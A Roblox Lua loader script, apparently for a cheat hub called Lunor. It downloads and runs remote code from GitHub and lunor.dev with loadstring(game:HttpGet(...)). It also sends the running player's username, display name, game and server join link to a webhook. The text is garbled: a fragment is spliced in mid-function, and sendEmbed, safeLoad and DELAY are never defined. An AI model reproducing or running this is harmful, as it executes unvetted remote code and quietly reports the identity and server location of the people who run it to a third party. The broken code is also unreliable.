-- Step 1: Run webhook sender first
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/yuunii-1/Files/refs/heads/main/SendDchook.lua"))()
end)

-- Step 2: Wait before loading others
wait(8)

-- Step 3: Load other scripts with error handling
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua"))()
end)

pcall(function()
    loadstring(game:HttpGet("https://lunor.dev/loader"))()
end)        return loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Failed to load script from:", url, "\nError:", result)
    end
end

-- Main
task.spawn(function()
    -- Get player info
    local player = game.Players.LocalPlayer
    local username = player and player.Name or "Unknown"
    local displayName = player and player.DisplayName or "Unknown"

    -- Game info
    local placeId = game.PlaceId
    local jobId = game.JobId
    local placeName = game:GetService("MarketplaceService"):GetProductInfo(placeId).Name

    -- Universal join link (PC + Mobile)
    local joinLink = ("[Click to Join](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)"):format(placeId, jobId)

    -- Build webhook description
    local description = string.format(
        "✅ **Script executed by:** %s (`%s`)\n🎮 **Game:** %s\n📌 **Place ID:** %d\n🔗 **Join Link:** %s\n🖥️ **Server Code:** %s\n⏳ Loader starting in %d seconds...",
        displayName,
        username,
        placeName,
        placeId,
        joinLink,
        jobId,
        DELAY
    )

    -- Send webhook
    sendEmbed("🚀 Loader Pending", description, 0xFFFF00) -- Yellow

    -- Wait before running loaders
    wait(DELAY)

    -- Load scripts
    safeLoad("https://lunor.dev/loader")
    safeLoad("https://raw.githubusercontent.com/Lunorhubb/LunorScript/refs/heads/main/Loader.lua")
end)
